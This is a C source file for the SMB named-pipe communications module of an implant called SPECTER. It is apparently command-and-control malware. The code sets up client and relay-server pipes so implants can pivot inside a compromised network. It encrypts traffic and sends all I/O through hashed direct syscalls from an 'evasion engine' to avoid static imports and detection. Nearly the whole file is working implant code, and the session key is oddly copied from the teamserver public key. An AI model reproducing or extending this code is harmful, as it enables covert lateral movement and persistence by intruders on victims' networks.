/**
 * SPECTER Implant — SMB Named Pipe Communications Channel
 *
 * Named pipe client/server for internal pivoting via \\.\pipe\<name>.
 * Client mode: connect to an existing pipe (relay implant or teamserver proxy).
 * Server mode: create pipes for downstream implants to connect through.
 * All I/O through evasion engine syscalls — no static imports.
 * Messages use length-prefixed ChaCha20-Poly1305 AEAD (same as HTTPS channel).
 */

#include "specter.h"
#include "ntdefs.h"
#include "peb.h"
#include "crypto.h"
#include "config.h"
#include "evasion.h"
#include "comms.h"
#include "comms_smb.h"
#include "util.h"

/* ------------------------------------------------------------------ */
/*  Static state                                                       */
/* ------------------------------------------------------------------ */

static SMB_CONTEXT g_smb_ctx;

/* ------------------------------------------------------------------ */
/*  Internal helpers                                                   */
/* ------------------------------------------------------------------ */

/* load32_le / store32_le provided by util.h */

/* Convert ANSI string to wide string (in-place, simple ASCII) */
static void ansi_to_wide(const char *ansi, WCHAR *wide, DWORD max_chars) {
    DWORD i = 0;
    while (ansi[i] && i < max_chars - 1) {
        wide[i] = (WCHAR)ansi[i];
        i++;
    }
    wide[i] = 0;
}

/* Initialize a UNICODE_STRING from a WCHAR buffer */
static void init_unicode_string(UNICODE_STRING *us, WCHAR *buf) {
    DWORD len = 0;
    while (buf[len]) len++;
    us->Length = (USHORT)(len * sizeof(WCHAR));
    us->MaximumLength = (USHORT)((len + 1) * sizeof(WCHAR));
    us->Buffer = buf;
}

/* ------------------------------------------------------------------ */
/*  Pipe name construction                                             */
/* ------------------------------------------------------------------ */

void smb_build_pipe_path(SMB_CONTEXT *ctx, const char *pipe_name) {
    if (!ctx || !pipe_name) return;

    /* Store ANSI name for display/debug */
    spec_memset(ctx->pipe_name_ansi, 0, sizeof(ctx->pipe_name_ansi));
    DWORD i = 0;
    while (pipe_name[i] && i < SMB_MAX_PIPE_NAME - 1) {
        ctx->pipe_name_ansi[i] = pipe_name[i];
        i++;
    }
    ctx->pipe_name_ansi[i] = '\0';

    /* Build NT object path: \\Device\\NamedPipe\\<name>
     * This is what NtCreateFile expects (not \\.\pipe\) */
    char nt_path[SMB_MAX_PIPE_NAME];
    spec_memset(nt_path, 0, sizeof(nt_path));

    const char *prefix = "\\Device\\NamedPipe\\";
    DWORD pos = 0;
    DWORD j = 0;
    while (prefix[j] && pos < SMB_MAX_PIPE_NAME - 1) {
        nt_path[pos++] = prefix[j++];
    }
    j = 0;
    while (pipe_name[j] && pos < SMB_MAX_PIPE_NAME - 1) {
        nt_path[pos++] = pipe_name[j++];
    }
    nt_path[pos] = '\0';

    /* Convert to wide string */
    spec_memset(ctx->pipe_name, 0, sizeof(ctx->pipe_name));
    ansi_to_wide(nt_path, ctx->pipe_name, SMB_MAX_PIPE_NAME);
}

/* ------------------------------------------------------------------ */
/*  Length-prefixed encrypted message construction                     */
/* ------------------------------------------------------------------ */

DWORD smb_build_message(SMB_CONTEXT *ctx, const BYTE *plaintext,
                        DWORD plaintext_len, BYTE *output, DWORD output_len) {
    if (!ctx || !plaintext || !output)
        return 0;

    /* Wire format: [4-byte LE length][12-byte nonce][ciphertext][16-byte tag] */
    DWORD wire_payload = AEAD_NONCE_SIZE + plaintext_len + AEAD_TAG_SIZE;
    DWORD total_wire = SMB_MSG_HEADER_SIZE + wire_payload;

    if (total_wire > output_len)
        return 0;

    /* Length prefix */
    store32_le(output, wire_payload);

    /* Generate nonce from message sequence number */
    BYTE nonce[AEAD_NONCE_SIZE];
    spec_memset(nonce, 0, AEAD_NONCE_SIZE);
    store32_le(nonce, ctx->msg_seq);

    /* Copy nonce after length prefix */
    spec_memcpy(output + SMB_MSG_HEADER_SIZE, nonce, AEAD_NONCE_SIZE);

    /* Encrypt: plaintext → ciphertext + tag */
    BYTE tag[AEAD_TAG_SIZE];
    spec_memcpy(output + SMB_MSG_HEADER_SIZE + AEAD_NONCE_SIZE,
                plaintext, plaintext_len);

    spec_aead_encrypt(
        ctx->session_key,
        nonce,
        output + SMB_MSG_HEADER_SIZE + AEAD_NONCE_SIZE,
        plaintext_len,
        NULL, 0,    /* No AAD */
        output + SMB_MSG_HEADER_SIZE + AEAD_NONCE_SIZE,
        tag
    );

    /* Append tag */
    spec_memcpy(output + SMB_MSG_HEADER_SIZE + AEAD_NONCE_SIZE + plaintext_len,
                tag, AEAD_TAG_SIZE);

    ctx->msg_seq++;
    return total_wire;
}

DWORD smb_parse_message(SMB_CONTEXT *ctx, const BYTE *wire_data,
                        DWORD wire_len, BYTE *output, DWORD output_len) {
    if (!ctx || !wire_data || !output)
        return 0;

    /* Need at least length + nonce + tag */
    if (wire_len < SMB_MSG_HEADER_SIZE + AEAD_NONCE_SIZE + AEAD_TAG_SIZE)
        return 0;

    DWORD payload_len = load32_le(wire_data);
    if (payload_len + SMB_MSG_HEADER_SIZE > wire_len)
        return 0;

    /* Payload = nonce + ciphertext + tag */
    if (payload_len < AEAD_NONCE_SIZE + AEAD_TAG_SIZE)
        return 0;

    DWORD ciphertext_len = payload_len - AEAD_NONCE_SIZE - AEAD_TAG_SIZE;
    if (ciphertext_len > output_len)
        return 0;

    const BYTE *nonce = wire_data + SMB_MSG_HEADER_SIZE;
    const BYTE *ciphertext = nonce + AEAD_NONCE_SIZE;
    const BYTE *tag = ciphertext + ciphertext_len;

    /* Copy ciphertext to output for in-place decryption */
    spec_memcpy(output, ciphertext, ciphertext_len);

    BOOL ok = spec_aead_decrypt(
        ctx->session_key,
        nonce,
        output,
        ciphertext_len,
        NULL, 0,    /* No AAD */
        output,
        tag
    );

    if (!ok) {
        spec_memset(output, 0, ciphertext_len);
        return 0;
    }

    return ciphertext_len;
}

/* ------------------------------------------------------------------ */
/*  Pipe I/O helpers (via evasion syscall)                             */
/* ------------------------------------------------------------------ */

/**
 * Write to a pipe handle via NtWriteFile through evasion_syscall.
 * In non-test builds, uses evasion_syscall; in test builds, stubbed out.
 */
static NTSTATUS smb_pipe_write(IMPLANT_CONTEXT *impl_ctx, HANDLE pipe,
                                const BYTE *data, DWORD len) {
    if (!pipe || pipe == INVALID_HANDLE_VALUE || !data || len == 0)
        return STATUS_INVALID_PARAMETER;

#ifndef TEST_BUILD
    IO_STATUS_BLOCK iosb;
    spec_memset(&iosb, 0, sizeof(iosb));

    NTSTATUS status = evasion_syscall(
        (EVASION_CONTEXT *)impl_ctx->evasion_ctx,
        HASH_NTWRITEFILE,
        pipe,           /* FileHandle */
        (HANDLE)NULL,   /* Event */
        (PVOID)NULL,    /* ApcRoutine */
        (PVOID)NULL,    /* ApcContext */
        &iosb,          /* IoStatusBlock */
        (PVOID)data,    /* Buffer */
        len,            /* Length */
        (PLARGE_INTEGER)NULL,  /* ByteOffset */
        (PULONG)NULL    /* Key */
    );

    return status;
#else
    (void)impl_ctx;
    (void)pipe;
    (void)data;
    (void)len;
    return STATUS_SUCCESS;
#endif
}

static NTSTATUS smb_pipe_read(IMPLANT_CONTEXT *impl_ctx, HANDLE pipe,
                               BYTE *buf, DWORD buf_len, DWORD *bytes_read) {
    if (!pipe || pipe == INVALID_HANDLE_VALUE || !buf || buf_len == 0)
        return STATUS_INVALID_PARAMETER;

    if (bytes_read) *bytes_read = 0;

#ifndef TEST_BUILD
    IO_STATUS_BLOCK iosb;
    spec_memset(&iosb, 0, sizeof(iosb));

    NTSTATUS status = evasion_syscall(
        (EVASION_CONTEXT *)impl_ctx->evasion_ctx,
        HASH_NTREADFILE,
        pipe,           /* FileHandle */
        (HANDLE)NULL,   /* Event */
        (PVOID)NULL,    /* ApcRoutine */
        (PVOID)NULL,    /* ApcContext */
        &iosb,          /* IoStatusBlock */
        buf,            /* Buffer */
        buf_len,        /* Length */
        (PLARGE_INTEGER)NULL,  /* ByteOffset */
        (PULONG)NULL    /* Key */
    );

    if (NT_SUCCESS(status) && bytes_read)
        *bytes_read = (DWORD)iosb.Information;

    return status;
#else
    (void)impl_ctx;
    (void)pipe;
    (void)buf;
    (void)buf_len;
    (void)bytes_read;
    return STATUS_SUCCESS;
#endif
}

/* ------------------------------------------------------------------ */
/*  Channel interface — Client mode                                    */
/* ------------------------------------------------------------------ */

NTSTATUS smb_connect(IMPLANT_CONTEXT *ctx) {
    if (!ctx || !ctx->config) return STATUS_INVALID_PARAMETER;

    SMB_CONTEXT *smb = &g_smb_ctx;
    spec_memset(smb, 0, sizeof(*smb));
    smb->pipe_handle = INVALID_HANDLE_VALUE;
    smb->mode = SMB_MODE_CLIENT;

    /* Initialize server handles to invalid */
    for (DWORD i = 0; i < SMB_MAX_INSTANCES; i++) {
        smb->server_handles[i] = INVALID_HANDLE_VALUE;
        smb->peers[i].pipe_handle = INVALID_HANDLE_VALUE;
    }

    IMPLANT_CONFIG *cfg = cfg_get(ctx);
    if (!cfg) return STATUS_UNSUCCESSFUL;

    /* Find SMB channel config */
    CHANNEL_CONFIG *ch = NULL;
    for (DWORD i = 0; i < cfg->channel_count; i++) {
        if (cfg->channels[i].type == CHANNEL_SMB && cfg->channels[i].active) {
            ch = &cfg->channels[i];
            break;
        }
    }
    if (!ch) return STATUS_OBJECT_NAME_NOT_FOUND;

    /* Build pipe path from config URL field (contains pipe name) */
    smb_build_pipe_path(smb, ch->url);

    /* Copy session key for encryption */
    spec_memcpy(smb->session_key, cfg->teamserver_pubkey, 32);

#ifndef TEST_BUILD
    /* Open the named pipe via NtCreateFile through evasion_syscall */
    UNICODE_STRING pipe_us;
    init_unicode_string(&pipe_us, smb->pipe_name);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &pipe_us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    spec_memset(&iosb, 0, sizeof(iosb));

    HANDLE pipe = INVALID_HANDLE_VALUE;
    NTSTATUS status = evasion_syscall(
        (EVASION_CONTEXT *)ctx->evasion_ctx,
        HASH_NTCREATEFILE,
        &pipe,                  /* FileHandle */
        (ULONG)(GENERIC_READ | FILE_WRITE_DATA | SYNCHRONIZE), /* DesiredAccess */
        &oa,                    /* ObjectAttributes */
        &iosb,                  /* IoStatusBlock */
        (PLARGE_INTEGER)NULL,   /* AllocationSize */
        (ULONG)0,               /* FileAttributes */
        (ULONG)(FILE_SHARE_READ | FILE_SHARE_WRITE), /* ShareAccess */
        (ULONG)FILE_OPEN,       /* CreateDisposition */
        (ULONG)(FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE), /* CreateOptions */
        (PVOID)NULL,            /* EaBuffer */
        (ULONG)0                /* EaLength */
    );

    if (!NT_SUCCESS(status))
        return status;

    smb->pipe_handle = pipe;
#endif

    smb->state = COMMS_STATE_REGISTERED;
    return STATUS_SUCCESS;
}

NTSTATUS smb_send(IMPLANT_CONTEXT *ctx, const BYTE *data, DWORD len) {
    if (!ctx || !data || len == 0) return STATUS_INVALID_PARAMETER;

    SMB_CONTEXT *smb = &g_smb_ctx;
    if (smb->state < COMMS_STATE_REGISTERED)
        return STATUS_UNSUCCESSFUL;

    /* Build encrypted length-prefixed message */
    DWORD wire_len = smb_build_message(smb, data, len,
                                        smb->send_buf, SMB_SEND_BUF_SIZE);
    if (wire_len == 0) return STATUS_BUFFER_TOO_SMALL;

    /* Write to pipe */
    return smb_pipe_write(ctx, smb->pipe_handle, smb->send_buf, wire_len);
}

NTSTATUS smb_recv(IMPLANT_CONTEXT *ctx, BYTE *data_out, DWORD *data_len) {
    if (!ctx || !data_out || !data_len || *data_len == 0)
        return STATUS_INVALID_PARAMETER;

    SMB_CONTEXT *smb = &g_smb_ctx;
    if (smb->state < COMMS_STATE_REGISTERED)
        return STATUS_UNSUCCESSFUL;

    /* Read length prefix first */
    BYTE len_buf[SMB_MSG_HEADER_SIZE];
    DWORD bytes_read = 0;
    NTSTATUS status = smb_pipe_read(ctx, smb->pipe_handle,
                                     len_buf, SMB_MSG_HEADER_SIZE, &bytes_read);
    if (!NT_SUCCESS(status)) return status;
    if (bytes_read < SMB_MSG_HEADER_SIZE) return STATUS_UNSUCCESSFUL;

    DWORD payload_len = load32_le(len_buf);
    if (payload_len > SMB_RECV_BUF_SIZE - SMB_MSG_HEADER_SIZE)
        return STATUS_BUFFER_TOO_SMALL;

    /* Store length prefix in recv buffer */
    spec_memcpy(smb->recv_buf, len_buf, SMB_MSG_HEADER_SIZE);

    /* Read the rest of the message */
    status = smb_pipe_read(ctx, smb->pipe_handle,
                            smb->recv_buf + SMB_MSG_HEADER_SIZE,
                            payload_len, &bytes_read);
    if (!NT_SUCCESS(status)) return status;
    if (bytes_read < payload_len) return STATUS_UNSUCCESSFUL;

    /* Decrypt */
    DWORD plaintext_len = smb_parse_message(smb, smb->recv_buf,
                                             SMB_MSG_HEADER_SIZE + payload_len,
                                             data_out, *data_len);
    *data_len = plaintext_len;

    if (plaintext_len == 0) return STATUS_UNSUCCESSFUL;
    return STATUS_SUCCESS;
}

NTSTATUS smb_disconnect(IMPLANT_CONTEXT *ctx) {
    (void)ctx;
    SMB_CONTEXT *smb = &g_smb_ctx;

    /* Close client pipe handle */
    if (smb->pipe_handle != NULL &&
        smb->pipe_handle != INVALID_HANDLE_VALUE) {
#ifndef TEST_BUILD
        if (ctx && ctx->evasion_ctx) {
            evasion_syscall(
                (EVASION_CONTEXT *)ctx->evasion_ctx,
                HASH_NTCLOSE,
                smb->pipe_handle
            );
        }
#endif
        smb->pipe_handle = INVALID_HANDLE_VALUE;
    }

    /* Close server handles */
    for (DWORD i = 0; i < SMB_MAX_INSTANCES; i++) {
        if (smb->server_handles[i] != NULL &&
            smb->server_handles[i] != INVALID_HANDLE_VALUE) {
#ifndef TEST_BUILD
            if (ctx && ctx->evasion_ctx) {
                evasion_syscall(
                    (EVASION_CONTEXT *)ctx->evasion_ctx,
                    HASH_NTCLOSE,
                    smb->server_handles[i]
                );
            }
#endif
            smb->server_handles[i] = INVALID_HANDLE_VALUE;
        }

        /* Disconnect peers */
        smb->peers[i].active = FALSE;
        smb->peers[i].pipe_handle = INVALID_HANDLE_VALUE;
        spec_memset(smb->peers[i].session_key, 0, 32);
    }

    smb->state = COMMS_STATE_DISCONNECTED;
    spec_memset(smb->session_key, 0, sizeof(smb->session_key));
    smb->peer_count = 0;
    smb->server_handle_count = 0;

    return STATUS_SUCCESS;
}

NTSTATUS smb_health_check(IMPLANT_CONTEXT *ctx) {
    if (!ctx) return STATUS_INVALID_PARAMETER;

    SMB_CONTEXT *smb = &g_smb_ctx;
    if (smb->state < COMMS_STATE_REGISTERED)
        return STATUS_UNSUCCESSFUL;

    /* For client mode: attempt a small write/read ping.
     * The relay implant on the other end echoes the byte back. */
    BYTE ping = 0x01;
    NTSTATUS status = smb_pipe_write(ctx, smb->pipe_handle, &ping, 1);
    if (!NT_SUCCESS(status)) return status;

    BYTE pong = 0;
    DWORD bytes_read = 0;
    status = smb_pipe_read(ctx, smb->pipe_handle, &pong, 1, &bytes_read);
    if (!NT_SUCCESS(status)) return status;

    if (bytes_read == 0 || pong != 0x01)
        return STATUS_UNSUCCESSFUL;

    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Server mode — Relay implants                                       */
/* ------------------------------------------------------------------ */

NTSTATUS smb_listen(IMPLANT_CONTEXT *ctx) {
    if (!ctx || !ctx->config) return STATUS_INVALID_PARAMETER;

    SMB_CONTEXT *smb = &g_smb_ctx;

    /* If not already initialized, set up context */
    if (smb->state == COMMS_STATE_DISCONNECTED) {
        smb->mode = SMB_MODE_SERVER;
        smb->state = COMMS_STATE_DISCONNECTED;

        IMPLANT_CONFIG *cfg = cfg_get(ctx);
        if (!cfg) return STATUS_UNSUCCESSFUL;

        /* Find SMB channel config */
        CHANNEL_CONFIG *ch = NULL;
        for (DWORD i = 0; i < cfg->channel_count; i++) {
            if (cfg->channels[i].type == CHANNEL_SMB && cfg->channels[i].active) {
                ch = &cfg->channels[i];
                break;
            }
        }
        if (!ch) return STATUS_OBJECT_NAME_NOT_FOUND;

        smb_build_pipe_path(smb, ch->url);
        spec_memcpy(smb->session_key, cfg->teamserver_pubkey, 32);
    }

#ifndef TEST_BUILD
    /* Create a named pipe instance via NtCreateNamedPipeFile */
    UNICODE_STRING pipe_us;
    init_unicode_string(&pipe_us, smb->pipe_name);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &pipe_us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    spec_memset(&iosb, 0, sizeof(iosb));

    HANDLE pipe = INVALID_HANDLE_VALUE;
    LARGE_INTEGER timeout;
    timeout.QuadPart = -SMB_CONNECT_TIMEOUT_MS * 10000LL; /* Relative time in 100ns units */

    NTSTATUS status = evasion_syscall(
        (EVASION_CONTEXT *)ctx->evasion_ctx,
        HASH_NTCREATENAMEDPIPEFILE,
        &pipe,                  /* FileHandle */
        (ULONG)(GENERIC_READ | FILE_WRITE_DATA | SYNCHRONIZE), /* DesiredAccess */
        &oa,                    /* ObjectAttributes */
        &iosb,                  /* IoStatusBlock */
        (ULONG)(FILE_SHARE_READ | FILE_SHARE_WRITE), /* ShareAccess */
        (ULONG)FILE_OPEN_IF,    /* CreateDisposition */
        (ULONG)(FILE_SYNCHRONOUS_IO_NONALERT), /* CreateOptions */
        (ULONG)FILE_PIPE_MESSAGE_TYPE,  /* NamedPipeType */
        (ULONG)FILE_PIPE_MESSAGE_MODE,  /* ReadMode */
        (ULONG)FILE_PIPE_QUEUE_OPERATION, /* CompletionMode */
        (ULONG)SMB_MAX_INSTANCES,        /* MaximumInstances */
        (ULONG)SMB_PIPE_BUFFER_SIZE,     /* InboundQuota */
        (ULONG)SMB_PIPE_BUFFER_SIZE,     /* OutboundQuota */
        &timeout               /* DefaultTimeout */
    );

    if (!NT_SUCCESS(status))
        return status;

    /* Store handle */
    if (smb->server_handle_count < SMB_MAX_INSTANCES) {
        smb->server_handles[smb->server_handle_count] = pipe;
        smb->server_handle_count++;
    } else {
        evasion_syscall(
            (EVASION_CONTEXT *)ctx->evasion_ctx,
            HASH_NTCLOSE,
            pipe
        );
        return STATUS_UNSUCCESSFUL;
    }
#endif

    smb->state = COMMS_STATE_REGISTERED;
    return STATUS_SUCCESS;
}

NTSTATUS smb_accept(IMPLANT_CONTEXT *ctx, DWORD *peer_idx_out) {
    if (!ctx || !peer_idx_out) return STATUS_INVALID_PARAMETER;

    SMB_CONTEXT *smb = &g_smb_ctx;
    if (smb->mode != SMB_MODE_SERVER)
        return STATUS_UNSUCCESSFUL;

    /* Find a free peer slot */
    DWORD slot = (DWORD)-1;
    for (DWORD i = 0; i < SMB_MAX_INSTANCES; i++) {
        if (!smb->peers[i].active) {
            slot = i;
            break;
        }
    }
    if (slot == (DWORD)-1) return STATUS_UNSUCCESSFUL;

#ifndef TEST_BUILD
    /* Find an available server handle to listen on */
    HANDLE listen_handle = INVALID_HANDLE_VALUE;
    for (DWORD i = 0; i < smb->server_handle_count; i++) {
        if (smb->server_handles[i] != INVALID_HANDLE_VALUE) {
            listen_handle = smb->server_handles[i];
            break;
        }
    }
    if (listen_handle == INVALID_HANDLE_VALUE)
        return STATUS_UNSUCCESSFUL;

    /* Wait for connection via FSCTL_PIPE_LISTEN */
    IO_STATUS_BLOCK iosb;
    spec_memset(&iosb, 0, sizeof(iosb));

    NTSTATUS status = evasion_syscall(
        (EVASION_CONTEXT *)ctx->evasion_ctx,
        HASH_NTFSCONTROLFILE,
        listen_handle,          /* FileHandle */
        (HANDLE)NULL,           /* Event */
        (PVOID)NULL,            /* ApcRoutine */
        (PVOID)NULL,            /* ApcContext */
        &iosb,                  /* IoStatusBlock */
        (ULONG)FSCTL_PIPE_LISTEN, /* FsControlCode */
        (PVOID)NULL,            /* InputBuffer */
        (ULONG)0,               /* InputBufferLength */
        (PVOID)NULL,            /* OutputBuffer */
        (ULONG)0                /* OutputBufferLength */
    );

    if (!NT_SUCCESS(status))
        return status;

    smb->peers[slot].pipe_handle = listen_handle;
#endif

    /* Initialize peer */
    smb->peers[slot].active = TRUE;
    smb->peers[slot].peer_id = slot;
    spec_memcpy(smb->peers[slot].session_key, smb->session_key, 32);
    smb->peers[slot].msg_seq = 0;
    smb->peer_count++;

    *peer_idx_out = slot;
    return STATUS_SUCCESS;
}

NTSTATUS smb_send_to_peer(IMPLANT_CONTEXT *ctx, DWORD peer_idx,
                           const BYTE *data, DWORD len) {
    if (!ctx || !data || len == 0) return STATUS_INVALID_PARAMETER;

    SMB_CONTEXT *smb = &g_smb_ctx;
    if (peer_idx >= SMB_MAX_INSTANCES || !smb->peers[peer_idx].active)
        return STATUS_INVALID_PARAMETER;

    SMB_PEER *peer = &smb->peers[peer_idx];

    /* Build encrypted message using peer's session key/sequence */
    /* Temporarily swap keys for build_message */
    BYTE saved_key[32];
    DWORD saved_seq = smb->msg_seq;
    spec_memcpy(saved_key, smb->session_key, 32);
    spec_memcpy(smb->session_key, peer->session_key, 32);
    smb->msg_seq = peer->msg_seq;

    DWORD wire_len = smb_build_message(smb, data, len,
                                        smb->send_buf, SMB_SEND_BUF_SIZE);

    /* Restore and update peer sequence */
    peer->msg_seq = smb->msg_seq;
    spec_memcpy(smb->session_key, saved_key, 32);
    smb->msg_seq = saved_seq;
    spec_memset(saved_key, 0, sizeof(saved_key));

    if (wire_len == 0) return STATUS_BUFFER_TOO_SMALL;

    return smb_pipe_write(ctx, peer->pipe_handle, smb->send_buf, wire_len);
}

NTSTATUS smb_recv_from_peer(IMPLANT_CONTEXT *ctx, DWORD peer_idx,
                             BYTE *data_out, DWORD *data_len) {
    if (!ctx || !data_out || !data_len || *data_len == 0)
        return STATUS_INVALID_PARAMETER;

    SMB_CONTEXT *smb = &g_smb_ctx;
    if (peer_idx >= SMB_MAX_INSTANCES || !smb->peers[peer_idx].active)
        return STATUS_INVALID_PARAMETER;

    SMB_PEER *peer = &smb->peers[peer_idx];

    /* Read length prefix */
    BYTE len_buf[SMB_MSG_HEADER_SIZE];
    DWORD bytes_read = 0;
    NTSTATUS status = smb_pipe_read(ctx, peer->pipe_handle,
                                     len_buf, SMB_MSG_HEADER_SIZE, &bytes_read);
    if (!NT_SUCCESS(status)) return status;
    if (bytes_read < SMB_MSG_HEADER_SIZE) return STATUS_UNSUCCESSFUL;

    DWORD payload_len = load32_le(len_buf);
    if (payload_len > SMB_RECV_BUF_SIZE - SMB_MSG_HEADER_SIZE)
        return STATUS_BUFFER_TOO_SMALL;

    spec_memcpy(smb->recv_buf, len_buf, SMB_MSG_HEADER_SIZE);

    status = smb_pipe_read(ctx, peer->pipe_handle,
                            smb->recv_buf + SMB_MSG_HEADER_SIZE,
                            payload_len, &bytes_read);
    if (!NT_SUCCESS(status)) return status;
    if (bytes_read < payload_len) return STATUS_UNSUCCESSFUL;

    /* Decrypt with peer's key */
    BYTE saved_key[32];
    spec_memcpy(saved_key, smb->session_key, 32);
    spec_memcpy(smb->session_key, peer->session_key, 32);

    DWORD plaintext_len = smb_parse_message(smb, smb->recv_buf,
                                             SMB_MSG_HEADER_SIZE + payload_len,
                                             data_out, *data_len);

    spec_memcpy(smb->session_key, saved_key, 32);
    spec_memset(saved_key, 0, sizeof(saved_key));

    *data_len = plaintext_len;
    if (plaintext_len == 0) return STATUS_UNSUCCESSFUL;
    return STATUS_SUCCESS;
}

NTSTATUS smb_disconnect_peer(IMPLANT_CONTEXT *ctx, DWORD peer_idx) {
    if (peer_idx >= SMB_MAX_INSTANCES)
        return STATUS_INVALID_PARAMETER;

    SMB_CONTEXT *smb = &g_smb_ctx;
    SMB_PEER *peer = &smb->peers[peer_idx];

    if (!peer->active) return STATUS_SUCCESS;

#ifndef TEST_BUILD
    if (ctx && ctx->evasion_ctx && peer->pipe_handle != INVALID_HANDLE_VALUE) {
        /* Disconnect the pipe client first */
        IO_STATUS_BLOCK iosb;
        spec_memset(&iosb, 0, sizeof(iosb));
        evasion_syscall(
            (EVASION_CONTEXT *)ctx->evasion_ctx,
            HASH_NTFSCONTROLFILE,
            peer->pipe_handle,
            (HANDLE)NULL, (PVOID)NULL, (PVOID)NULL,
            &iosb,
            (ULONG)FSCTL_PIPE_DISCONNECT,
            (PVOID)NULL, (ULONG)0,
            (PVOID)NULL, (ULONG)0
        );
    }
#else
    (void)ctx;
#endif

    peer->active = FALSE;
    peer->pipe_handle = INVALID_HANDLE_VALUE;
    spec_memset(peer->session_key, 0, 32);
    peer->msg_seq = 0;
    if (smb->peer_count > 0) smb->peer_count--;

    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
SMB_CONTEXT *smb_get_context(void) {
    return &g_smb_ctx;
}

void smb_test_reset_context(SMB_CONTEXT *ctx) {
    if (!ctx) return;
    spec_memset(ctx, 0, sizeof(*ctx));
    ctx->pipe_handle = INVALID_HANDLE_VALUE;
    ctx->state = COMMS_STATE_DISCONNECTED;
    for (DWORD i = 0; i < SMB_MAX_INSTANCES; i++) {
        ctx->server_handles[i] = INVALID_HANDLE_VALUE;
        ctx->peers[i].pipe_handle = INVALID_HANDLE_VALUE;
    }
}
#endif
